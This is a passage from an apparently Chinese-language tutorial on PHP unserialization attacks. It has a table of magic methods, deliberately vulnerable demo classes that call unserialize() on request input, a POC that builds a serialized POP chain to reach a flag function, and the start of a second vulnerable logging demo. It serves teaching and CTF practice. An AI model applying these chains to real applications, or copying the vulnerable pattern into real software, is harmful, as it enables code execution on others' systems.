<p>bypass payload<br></p><figure class="highlight php hljs"><table><tbody><tr><td class="code"><pre><span class="line">payload1 = O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;Test&quot;</span>:<span class="hljs-number">2</span>:{s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;P2hm1n&quot;</span>;}</span><br><span class="line"><span class="hljs-comment">// Bypass</span></span><br></pre></td></tr></tbody></table></figure><p></p>
<h2 id="POP&#x94FE;&#x6784;&#x9020;"><a href="#POP&#x94FE;&#x6784;&#x9020;" class="headerlink" title="POP&#x94FE;&#x6784;&#x9020;"></a>POP&#x94FE;&#x6784;&#x9020;</h2><h3 id="&#x77E5;&#x8BC6;&#x56DE;&#x987E;"><a href="#&#x77E5;&#x8BC6;&#x56DE;&#x987E;" class="headerlink" title="&#x77E5;&#x8BC6;&#x56DE;&#x987E;"></a>&#x77E5;&#x8BC6;&#x56DE;&#x987E;</h3><p><a href="https://blog.riskivy.com/%E6%8C%96%E6%8E%98%E6%9A%97%E8%97%8Fthinkphp%E4%B8%AD%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%88%A9%E7%94%A8%E9%93%BE/" target="_blank" rel="noopener">&#x6316;&#x6398;&#x6697;&#x85CF;ThinkPHP&#x4E2D;&#x7684;&#x53CD;&#x5E8F;&#x5217;&#x5229;&#x7528;&#x94FE;</a> &#x4E00;&#x6587;&#x4E2D;&#x603B;&#x7ED3;&#x7684;&#x633A;&#x597D;&#x4E86;&#x3002;</p>
<table>
<thead>
<tr>
<th align="left">&#x65B9;&#x6CD5;&#x540D;</th>
<th align="left">&#x8C03;&#x7528;&#x6761;&#x4EF6;</th>
</tr>
</thead>
<tbody><tr>
<td align="left">__call</td>
<td align="left">&#x8C03;&#x7528;&#x4E0D;&#x53EF;&#x8BBF;&#x95EE;&#x6216;&#x4E0D;&#x5B58;&#x5728;&#x7684;&#x65B9;&#x6CD5;&#x65F6;&#x88AB;&#x8C03;&#x7528;</td>
</tr>
<tr>
<td align="left">__callStatic</td>
<td align="left">&#x8C03;&#x7528;&#x4E0D;&#x53EF;&#x8BBF;&#x95EE;&#x6216;&#x4E0D;&#x5B58;&#x5728;&#x7684;&#x9759;&#x6001;&#x65B9;&#x6CD5;&#x65F6;&#x88AB;&#x8C03;&#x7528;</td>
</tr>
<tr>
<td align="left">__clone</td>
<td align="left">&#x8FDB;&#x884C;&#x5BF9;&#x8C61;clone&#x65F6;&#x88AB;&#x8C03;&#x7528;&#xFF0C;&#x7528;&#x6765;&#x8C03;&#x6574;&#x5BF9;&#x8C61;&#x7684;&#x514B;&#x9686;&#x884C;&#x4E3A;</td>
</tr>
<tr>
<td align="left">__constuct</td>
<td align="left">&#x6784;&#x5EFA;&#x5BF9;&#x8C61;&#x7684;&#x65F6;&#x88AB;&#x8C03;&#x7528;&#xFF1B;</td>
</tr>
<tr>
<td align="left">__debuginfo</td>
<td align="left">&#x5F53;&#x8C03;&#x7528;var_dump()&#x6253;&#x5370;&#x5BF9;&#x8C61;&#x65F6;&#x88AB;&#x8C03;&#x7528;&#xFF08;&#x5F53;&#x4F60;&#x4E0D;&#x60F3;&#x6253;&#x5370;&#x6240;&#x6709;&#x5C5E;&#x6027;&#xFF09;&#x9002;&#x7528;&#x4E8E;PHP5.6&#x7248;&#x672C;</td>
</tr>
<tr>
<td align="left">__destruct</td>
<td align="left">&#x660E;&#x786E;&#x9500;&#x6BC1;&#x5BF9;&#x8C61;&#x6216;&#x811A;&#x672C;&#x7ED3;&#x675F;&#x65F6;&#x88AB;&#x8C03;&#x7528;&#xFF1B;</td>
</tr>
<tr>
<td align="left">__get</td>
<td align="left">&#x8BFB;&#x53D6;&#x4E0D;&#x53EF;&#x8BBF;&#x95EE;&#x6216;&#x4E0D;&#x5B58;&#x5728;&#x5C5E;&#x6027;&#x65F6;&#x88AB;&#x8C03;&#x7528;</td>
</tr>
<tr>
<td align="left">__invoke</td>
<td align="left">&#x5F53;&#x4EE5;&#x51FD;&#x6570;&#x65B9;&#x5F0F;&#x8C03;&#x7528;&#x5BF9;&#x8C61;&#x65F6;&#x88AB;&#x8C03;&#x7528;</td>
</tr>
<tr>
<td align="left">__isset</td>
<td align="left">&#x5BF9;&#x4E0D;&#x53EF;&#x8BBF;&#x95EE;&#x6216;&#x4E0D;&#x5B58;&#x5728;&#x7684;&#x5C5E;&#x6027;&#x8C03;&#x7528;isset()&#x6216;empty()&#x65F6;&#x88AB;&#x8C03;&#x7528;</td>
</tr>
<tr>
<td align="left">__set</td>
<td align="left">&#x5F53;&#x7ED9;&#x4E0D;&#x53EF;&#x8BBF;&#x95EE;&#x6216;&#x4E0D;&#x5B58;&#x5728;&#x5C5E;&#x6027;&#x8D4B;&#x503C;&#x65F6;&#x88AB;&#x8C03;&#x7528;</td>
</tr>
<tr>
<td align="left">__set_state</td>
<td align="left">&#x5F53;&#x8C03;&#x7528;var_export()&#x5BFC;&#x51FA;&#x7C7B;&#x65F6;&#xFF0C;&#x6B64;&#x9759;&#x6001;&#x65B9;&#x6CD5;&#x88AB;&#x8C03;&#x7528;&#x3002;&#x7528;__set_state&#x7684;&#x8FD4;&#x56DE;&#x503C;&#x505A;&#x4E3A;var_export&#x7684;&#x8FD4;&#x56DE;&#x503C;&#x3002;</td>
</tr>
<tr>
<td align="left">__sleep</td>
<td align="left">&#x5F53;&#x4F7F;&#x7528;serialize&#x65F6;&#x88AB;&#x8C03;&#x7528;&#xFF0C;&#x5F53;&#x4F60;&#x4E0D;&#x9700;&#x8981;&#x4FDD;&#x5B58;&#x5927;&#x5BF9;&#x8C61;&#x7684;&#x6240;&#x6709;&#x6570;&#x636E;&#x65F6;&#x5F88;&#x6709;&#x7528;</td>
</tr>
<tr>
<td align="left">__toString</td>
<td align="left">&#x5F53;&#x4E00;&#x4E2A;&#x7C7B;&#x88AB;&#x8F6C;&#x6362;&#x6210;&#x5B57;&#x7B26;&#x4E32;&#x65F6;&#x88AB;&#x8C03;&#x7528;</td>
</tr>
<tr>
<td align="left">__unset</td>
<td align="left">&#x5BF9;&#x4E0D;&#x53EF;&#x8BBF;&#x95EE;&#x6216;&#x4E0D;&#x5B58;&#x5728;&#x7684;&#x5C5E;&#x6027;&#x8FDB;&#x884C;unset&#x65F6;&#x88AB;&#x8C03;&#x7528;</td>
</tr>
<tr>
<td align="left">__wakeup</td>
<td align="left">&#x5F53;&#x4F7F;&#x7528;unserialize&#x65F6;&#x88AB;&#x8C03;&#x7528;&#xFF0C;&#x53EF;&#x7528;&#x4E8E;&#x505A;&#x4E9B;&#x5BF9;&#x8C61;&#x7684;&#x521D;&#x59CB;&#x5316;&#x64CD;&#x4F5C;</td>
</tr>
</tbody></table>
<ul>
<li>&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x7684;&#x5E38;&#x89C1;&#x8D77;&#x70B9;<ul>
<li><code>__wakeup</code> &#x4E00;&#x5B9A;&#x4F1A;&#x8C03;&#x7528;</li>
<li><code>__destruct</code> &#x4E00;&#x5B9A;&#x4F1A;&#x8C03;&#x7528;</li>
<li><code>__toString</code> &#x5F53;&#x4E00;&#x4E2A;&#x5BF9;&#x8C61;&#x88AB;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x540E;&#x53C8;&#x88AB;&#x5F53;&#x505A;&#x5B57;&#x7B26;&#x4E32;&#x4F7F;&#x7528;</li>
</ul>
</li>
</ul>
<ul>
<li>&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x7684;&#x5E38;&#x89C1;&#x4E2D;&#x95F4;&#x8DF3;&#x677F;:<ul>
<li><code>__toString</code> &#x5F53;&#x4E00;&#x4E2A;&#x5BF9;&#x8C61;&#x88AB;&#x5F53;&#x505A;&#x5B57;&#x7B26;&#x4E32;&#x4F7F;&#x7528;</li>
<li><code>__get</code> &#x8BFB;&#x53D6;&#x4E0D;&#x53EF;&#x8BBF;&#x95EE;&#x6216;&#x4E0D;&#x5B58;&#x5728;&#x5C5E;&#x6027;&#x65F6;&#x88AB;&#x8C03;&#x7528;</li>
<li><code>__set</code> &#x5F53;&#x7ED9;&#x4E0D;&#x53EF;&#x8BBF;&#x95EE;&#x6216;&#x4E0D;&#x5B58;&#x5728;&#x5C5E;&#x6027;&#x8D4B;&#x503C;&#x65F6;&#x88AB;&#x8C03;&#x7528;</li>
<li><code>__isset</code> &#x5BF9;&#x4E0D;&#x53EF;&#x8BBF;&#x95EE;&#x6216;&#x4E0D;&#x5B58;&#x5728;&#x7684;&#x5C5E;&#x6027;&#x8C03;&#x7528;isset()&#x6216;empty()&#x65F6;&#x88AB;&#x8C03;&#x7528;&#x3002;&#x5F62;&#x5982; <code>$this-&gt;$func();</code></li>
</ul>
</li>
</ul>
<ul>
<li>&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x7684;&#x5E38;&#x89C1;&#x7EC8;&#x70B9;:<ul>
<li><code>__call</code> &#x8C03;&#x7528;&#x4E0D;&#x53EF;&#x8BBF;&#x95EE;&#x6216;&#x4E0D;&#x5B58;&#x5728;&#x7684;&#x65B9;&#x6CD5;&#x65F6;&#x88AB;&#x8C03;&#x7528;</li>
<li><code>call_user_func</code> &#x4E00;&#x822C;php&#x4EE3;&#x7801;&#x6267;&#x884C;&#x90FD;&#x4F1A;&#x9009;&#x62E9;&#x8FD9;&#x91CC;</li>
<li><code>call_user_func_array</code> &#x4E00;&#x822C;php&#x4EE3;&#x7801;&#x6267;&#x884C;&#x90FD;&#x4F1A;&#x9009;&#x62E9;&#x8FD9;&#x91CC;</li>
</ul>
</li>
</ul>
<p>&#x4E3B;&#x8981;&#x8FD8;&#x662F;&#x4E09;&#x70B9;&#xFF1A;</p>
<ol>
<li>&#x8D77;&#x70B9;</li>
<li>&#x8DF3;&#x677F;</li>
<li>&#x4EE3;&#x7801;&#x6267;&#x884C;</li>
</ol>
<p>&#x4E2A;&#x4EBA;&#x611F;&#x89C9;&#x6838;&#x5FC3;&#x662F;&#x5B9E;&#x4F8B;&#x5316;&#x5BF9;&#x8C61;&#x53EF;&#x9644;&#x503C;&#x7ED9;&#x53D8;&#x91CF;,&#x4ECE;&#x800C;&#x8C03;&#x7528; + &#x5404;&#x7C7B;&#x9B54;&#x672F;&#x65B9;&#x6CD5;</p>
<h3 id="demo1"><a href="#demo1" class="headerlink" title="demo1"></a>demo1</h3><p>demo&#x5F15;&#x7528;&#x81EA; @twosmi1e &#x5E08;&#x5085; <a href="https://xz.aliyun.com/t/3674" target="_blank" rel="noopener">&#x5148;&#x77E5;&#x793E;&#x533A;</a>  &#x91CC;&#x7684;&#x4EE3;&#x7801;&#xFF1A;</p>
<p></p><figure class="highlight php hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">start_gg</span></span></span><br><span class="line"><span class="hljs-class"></span>{</span><br><span class="line">        <span class="hljs-keyword">public</span> $mod1;</span><br><span class="line">        <span class="hljs-keyword">public</span> $mod2;</span><br><span class="line">        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span><span class="hljs-params">()</span></span></span><br><span class="line"><span class="hljs-function">        </span>{</span><br><span class="line">                <span class="hljs-keyword">$this</span>-&gt;mod1-&gt;test1();</span><br><span class="line">        }</span><br><span class="line">}</span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Call</span></span></span><br><span class="line"><span class="hljs-class"></span>{</span><br><span class="line">        <span class="hljs-keyword">public</span> $mod1;</span><br><span class="line">        <span class="hljs-keyword">public</span> $mod2;</span><br><span class="line">        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">test1</span><span class="hljs-params">()</span></span></span><br><span class="line"><span class="hljs-function">    </span>{</span><br><span class="line">            <span class="hljs-keyword">$this</span>-&gt;mod1-&gt;test2();</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">funct</span></span></span><br><span class="line"><span class="hljs-class"></span>{</span><br><span class="line">        <span class="hljs-keyword">public</span> $mod1;</span><br><span class="line">        <span class="hljs-keyword">public</span> $mod2;</span><br><span class="line">        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span><span class="hljs-params">($test2,$arr)</span></span></span><br><span class="line"><span class="hljs-function">        </span>{</span><br><span class="line">                $s1 = <span class="hljs-keyword">$this</span>-&gt;mod1;</span><br><span class="line">                $s1();</span><br><span class="line">        }</span><br><span class="line">}</span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">func</span></span></span><br><span class="line"><span class="hljs-class"></span>{</span><br><span class="line">        <span class="hljs-keyword">public</span> $mod1;</span><br><span class="line">        <span class="hljs-keyword">public</span> $mod2;</span><br><span class="line">        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span><span class="hljs-params">()</span></span></span><br><span class="line"><span class="hljs-function">        </span>{</span><br><span class="line">                <span class="hljs-keyword">$this</span>-&gt;mod2 = <span class="hljs-string">&quot;&#x5B57;&#x7B26;&#x4E32;&#x62FC;&#x63A5;&quot;</span>.<span class="hljs-keyword">$this</span>-&gt;mod1;</span><br><span class="line">        } </span><br><span class="line">}</span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">string1</span></span></span><br><span class="line"><span class="hljs-class"></span>{</span><br><span class="line">        <span class="hljs-keyword">public</span> $str1;</span><br><span class="line">        <span class="hljs-keyword">public</span> $str2;</span><br><span class="line">        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span><span class="hljs-params">()</span></span></span><br><span class="line"><span class="hljs-function">        </span>{</span><br><span class="line">                <span class="hljs-keyword">$this</span>-&gt;str1-&gt;get_flag();</span><br><span class="line">                <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;1&quot;</span>;</span><br><span class="line">        }</span><br><span class="line">}</span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">GetFlag</span></span></span><br><span class="line"><span class="hljs-class"></span>{</span><br><span class="line">        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_flag</span><span class="hljs-params">()</span></span></span><br><span class="line"><span class="hljs-function">        </span>{</span><br><span class="line">                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;flag:&quot;</span>.<span class="hljs-string">&quot;xxxxxxxxxxxx&quot;</span>;</span><br><span class="line">        }</span><br><span class="line">}</span><br><span class="line">$a = $_GET[<span class="hljs-string">&apos;string&apos;</span>];</span><br><span class="line">unserialize($a);</span><br><span class="line"><span class="hljs-meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p>
<p>&#x4ECE;&#x524D;&#x5F80;&#x540E;&#x8DDF; or &#x4ECE;&#x540E;&#x5F80;&#x524D;&#x8DDF;&#xFF1F;</p>
<p>POC</p>
<p></p><figure class="highlight php hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">start_gg</span></span></span><br><span class="line"><span class="hljs-class"></span>{</span><br><span class="line">    <span class="hljs-keyword">public</span> $mod1;</span><br><span class="line">    <span class="hljs-keyword">public</span> $mod2;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">()</span></span></span><br><span class="line"><span class="hljs-function">    </span>{</span><br><span class="line">        <span class="hljs-keyword">$this</span>-&gt;mod1 = <span class="hljs-keyword">new</span> Call();</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span><span class="hljs-params">()</span></span></span><br><span class="line"><span class="hljs-function">    </span>{</span><br><span class="line">        <span class="hljs-keyword">$this</span>-&gt;mod1-&gt;test1(); <span class="hljs-comment"># &#x5165;&#x53E3;&#x70B9;&#xFF0C;mod1&#x53EF;&#x901A;&#x8FC7;&#x9644;&#x503C;&#x8D77;&#x8DF3;&#x3002;</span></span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Call</span></span></span><br><span class="line"><span class="hljs-class"></span>{</span><br><span class="line">    <span class="hljs-keyword">public</span> $mod1; <span class="hljs-comment"># &#x5B9E;&#x4F8B;&#x5316;funct</span></span><br><span class="line">    <span class="hljs-keyword">public</span> $mod2; <span class="hljs-comment"># &#x65E0;&#x5B83;&#x4EC0;&#x4E48;&#x4E8B;</span></span><br><span class="line"></span><br><span class="line">    <span class="hljs-comment"># &#x7EE7;&#x7EED;&#x8D77;&#x8DF3;&#xFF0C;&#x77BB;&#x524D;&#x987E;&#x540E;&#xFF0C;&#x601D;&#x8003;&#x4E0B;&#x9762;&#x7684; $this-&gt;mod1-&gt;test2();&#x4F1A;&#x5728;&#x4F55;&#x5904;&#x88AB;&#x4EC0;&#x4E48;&#x5229;&#x7528;</span></span><br><span class="line">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">()</span></span></span><br><span class="line"><span class="hljs-function">    </span>{</span><br><span class="line">        <span class="hljs-keyword">$this</span>-&gt;mod1 = <span class="hljs-keyword">new</span> funct();</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">test1</span><span class="hljs-params">()</span></span></span><br><span class="line"><span class="hljs-function">    </span>{</span><br><span class="line">        <span class="hljs-keyword">$this</span>-&gt;mod1-&gt;test2(); <span class="hljs-comment"># &#x8FD9;&#x91CC;&#x8C03; __call</span></span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">funct</span></span></span><br><span class="line"><span class="hljs-class"></span>{</span><br><span class="line">    <span class="hljs-keyword">public</span> $mod1; <span class="hljs-comment"># &#x5B9E;&#x4F8B;&#x5316;func</span></span><br><span class="line">    <span class="hljs-keyword">public</span> $mod2; <span class="hljs-comment"># &#x65E0;&#x5B83;&#x4EC0;&#x4E48;&#x4E8B;</span></span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">()</span></span></span><br><span class="line"><span class="hljs-function">    </span>{</span><br><span class="line">        <span class="hljs-keyword">$this</span>-&gt;mod1 = <span class="hljs-keyword">new</span> func();</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span><span class="hljs-params">($test2, $arr)</span></span></span><br><span class="line"><span class="hljs-function">    </span>{</span><br><span class="line">        $s1 = <span class="hljs-keyword">$this</span>-&gt;mod1;</span><br><span class="line">        $s1(); <span class="hljs-comment"># &#x8FD9;&#x91CC;&#x89E6;&#x53D1; __invoke</span></span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">func</span></span></span><br><span class="line"><span class="hljs-class"></span>{</span><br><span class="line">    <span class="hljs-keyword">public</span> $mod1; <span class="hljs-comment"># &#x5B9E;&#x4F8B;&#x5316;string1</span></span><br><span class="line">    <span class="hljs-keyword">public</span> $mod2; <span class="hljs-comment"># __invoke&#x5BF9;&#x5176;&#x9644;&#x503C;&#xFF0C;&#x5176;&#x5B9E;&#x662F;&#x4E3A;&#x4E86;&#x8C03; __toString</span></span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">()</span></span></span><br><span class="line"><span class="hljs-function">    </span>{</span><br><span class="line">        <span class="hljs-keyword">$this</span>-&gt;mod1 = <span class="hljs-keyword">new</span> string1();</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span><span class="hljs-params">()</span></span></span><br><span class="line"><span class="hljs-function">    </span>{</span><br><span class="line">        <span class="hljs-keyword">$this</span>-&gt;mod2 = <span class="hljs-string">&quot;&#x5B57;&#x7B26;&#x4E32;&#x62FC;&#x63A5;&quot;</span> . <span class="hljs-keyword">$this</span>-&gt;mod1; <span class="hljs-comment"># &#x8FD9;&#x91CC;&#x82E5;&#x62FC;&#x63A5;&#x5219;&#x4F1A;&#x89E6;&#x53D1; __toString</span></span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">string1</span></span></span><br><span class="line"><span class="hljs-class"></span>{</span><br><span class="line">    <span class="hljs-keyword">public</span> $str1; <span class="hljs-comment"># &#x5B9E;&#x4F8B;&#x5316; GetFlag</span></span><br><span class="line">    <span class="hljs-keyword">public</span> $str2;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">()</span></span></span><br><span class="line"><span class="hljs-function">    </span>{</span><br><span class="line">        <span class="hljs-keyword">$this</span>-&gt;str1 = <span class="hljs-keyword">new</span> GetFlag();</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span><span class="hljs-params">()</span></span></span><br><span class="line"><span class="hljs-function">    </span>{</span><br><span class="line">        <span class="hljs-keyword">$this</span>-&gt;str1-&gt;get_flag(); <span class="hljs-comment">#&#x8C03;&#x7528;&#x6B64;&#x5904;&#x5373;&#x53EF;getflag&#xFF0C;&#x96BE;&#x70B9;&#xFF1A;&#x9700;&#x8C03;&#x7528; __toString</span></span><br><span class="line">        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;1&quot;</span>;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">GetFlag</span></span></span><br><span class="line"><span class="hljs-class"></span>{</span><br><span class="line">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_flag</span><span class="hljs-params">()</span></span></span><br><span class="line"><span class="hljs-function">    </span>{</span><br><span class="line">        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;flag:&quot;</span> . <span class="hljs-string">&quot;xxxxxxxxxxxx&quot;</span>;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line">$payload = <span class="hljs-keyword">new</span> start_gg();</span><br><span class="line"><span class="hljs-keyword">echo</span> urlencode(serialize($payload));</span><br><span class="line"><span class="hljs-meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p>
<h3 id="demo2"><a href="#demo2" class="headerlink" title="demo2"></a>demo2</h3><p>demo&#x5F15;&#x7528;&#x81EA; @l3mon&#x5E08;&#x5085; <a href="https://www.cnblogs.com/iamstudy/articles/php_unserialize_pop_2.html" target="_blank" rel="noopener">blog</a> &#x91CC;&#x7684;&#x4EE3;&#x7801;&#xFF1A;</p>
<p></p><figure class="highlight php hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">OutputFilter</span> </span>{</span><br><span class="line">  <span class="hljs-keyword">protected</span> $matchPattern;</span><br><span class="line">  <span class="hljs-keyword">protected</span> $replacement;</span><br><span class="line">  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">($pattern, $repl)</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">$this</span>-&gt;matchPattern = $pattern;</span><br><span class="line">    <span class="hljs-keyword">$this</span>-&gt;replacement = $repl;</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span><span class="hljs-params">($data)</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">return</span> preg_replace(<span class="hljs-keyword">$this</span>-&gt;matchPattern, <span class="hljs-keyword">$this</span>-&gt;replacement, $data);</span><br><span class="line">  }</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">LogFileFormat</span> </span>{</span><br><span class="line">  <span class="hljs-keyword">protected</span> $filters;</span><br><span class="line">  <span class="hljs-keyword">protected</span> $endl;</span><br><span class="line">  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">($filters, $endl)</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">$this</span>-&gt;filters = $filters;</span><br><span class="line">    <span class="hljs-keyword">$this</span>-&gt;endl = $endl;</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">format</span><span class="hljs-params">($txt)</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">foreach</span> (<span class="hljs-keyword">$this</span>-&gt;filters <span class="hljs-keyword">as</span> $filter) {</span><br><span class="line">      $txt = $filter-&gt;filter($txt);</span><br><span class="line">    }</span><br><span class="line">    $txt = str_replace(<span class="hljs-string">&apos;\n&apos;</span>, <span class="hljs-keyword">$this</span>-&gt;endl, $txt);</span><br><span class="line">    <span class="hljs-keyword">return</span> $txt;</span><br><span class="line">  }</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">LogWriter_File</span> </span>{</span><br><span class="line">  <span class="hljs-keyword">protected</span> $filename;</span><br><span class="line">  <span class="hljs-keyword">protected</span> $format;</span><br><span class="line">  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">($filename, $format)</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">$this</span>-&gt;filename = str_replace(<span class="hljs-string">&quot;..&quot;</span>, <span class="hljs-string">&quot;__&quot;</span>, str_replace(<span class="hljs-string">&quot;/&quot;</span>, <span class="hljs-string">&quot;_&quot;</span>, $filename));</span><br><span class="line">    <span class="hljs-keyword">$this</span>-&gt;format = $format;</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">writeLog</span><span class="hljs-params">($txt)</span> </span>{</span><br><span class="line">    $txt = <span class="hljs-keyword">$this</span>-&gt;format-&gt;format($txt);</span><br><span class="line">    <span class="hljs-comment">//<span class="hljs-doctag">TODO:</span> Modify the address here, and delete this TODO.</span></span><br><span class="line">    file_put_contents(<span class="hljs-string">&quot;C:\\WWW\\test\\ctf\\kon\\&quot;</span> . <span class="hljs-keyword">$this</span>-&gt;filename, $txt, FILE_APPEND);</span><br><span class="line">  }</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Logger</span> </span>{</span><br><span class="line">  <span class="hljs-keyword">protected</span> $logwriter;</span><br><span class="line">  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">($writer)</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">$this</span>-&gt;logwriter = $writer;</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">log</span><span class="hljs-params">($txt)</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">$this</span>-&gt;logwriter-&gt;writeLog($txt);</span><br><span class="line">  }</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Song</span> </span>{</span><br><span class="line">  <span class="hljs-keyword">protected</span> $logger;</span><br><span class="line">  <span class="hljs-keyword">protected</span> $name;</span><br><span class="line">  <span class="hljs-keyword">protected</span> $group;</span><br><span class="line">  <span class="hljs-keyword">protected</span> $url;</span><br><span class="line">  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">($name, $group, $url)</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">$this</span>-&gt;name = $name;</span><br><span class="line">    <span class="hljs-keyword">$this</span>-&gt;group = $group;</span><br><span class="line">    <span class="hljs-keyword">$this</span>-&gt;url = $url;</span><br><span class="line">    $fltr = <span class="hljs-keyword">new</span> OutputFilter(<span class="hljs-string">&quot;/\[i\](.*)\[\/i\]/i&quot;</span>, <span class="hljs-string">&quot;&lt;i&gt;\\1&lt;/i&gt;&quot;</span>);</span><br><span class="line">    <span class="hljs-keyword">$this</span>-&gt;logger = <span class="hljs-keyword">new</span> Logger(<span class="hljs-keyword">new</span> LogWriter_File(<span class="hljs-string">&quot;song_views&quot;</span>, <span class="hljs-keyword">new</span> LogFileFormat(<span class="hljs-keyword">array</span>($fltr), <span class="hljs-string">&quot;\n&quot;</span>)));</span><br><span class="line">  }</span><br><span class="line">  <span 